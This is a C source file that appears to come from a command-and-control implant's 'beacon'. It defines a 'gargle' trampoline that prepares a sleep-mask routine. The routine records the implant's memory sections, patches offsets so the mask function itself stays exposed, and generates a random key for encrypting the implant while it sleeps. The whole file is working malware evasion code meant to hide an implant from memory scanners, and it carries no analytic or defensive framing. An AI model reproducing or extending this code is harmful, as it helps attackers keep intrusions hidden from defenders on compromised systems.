/* gargle! */
#include <windows.h>
#include <stdlib.h>
#include "crypto.h"
#include "beacon.h"
#include "gargleint.h"

void    * gtrampoline = NULL;
GARGLEP * gparms = NULL;

void gargle_trampoline(void * end, void * begin) {
	DWORD   dwFunctionSize;
	DWORD * index;
	DWORD a, b, temp;

	if (gtrampoline != NULL)
		return;

	/* calculate the size of our function */
	dwFunctionSize = (DWORD)((DWORD_PTR)end - (DWORD_PTR)begin);

	/* set trampoline to the start of the sleep mask function */
	gtrampoline = begin;

	/* setup our parameters, please */
	gparms = (GARGLEP *)malloc(sizeof(GARGLEP));
	track_memory_add(gparms, sizeof(GARGLEP), TRACK_MEMORY_MALLOC, FALSE, NULL);
	gparms->beacon_ptr = (char *)get_beacon_ptr();
	gparms->sections = (DWORD *)setting_ptr(SETTING_GARGLE_SECTIONS);
	gparms->heap_records = NULL; /* this is reset for each sleep. */

	/* update place holder addresses in the sections, so the sleep mask function
	 * will not be masked.
	 */
	index = gparms->sections;
	while (TRUE) {
		a = *index; b = *(index + 1);
		if (a == 0 && b == 0) {
			break;
		}
		if (a == -1) {
		    /* Replace this with the sleep mask function end location */
			temp = (DWORD)end - (DWORD)gparms->beacon_ptr;
			memcpy(index, &temp, sizeof(DWORD));
			a = *index;
		}
		if (b == -1) {
		    /* Replace this with the sleep mask function begin location */
			temp = (DWORD)begin - (DWORD)gparms->beacon_ptr;
			memcpy(index + 1, &temp, sizeof(DWORD));
			b = *(index + 1);
		}
		index += 2; /* goto the next section */
	}
	crypto_rng_get_bytes((unsigned char *)gparms->mask, sizeof(gparms->mask));
}
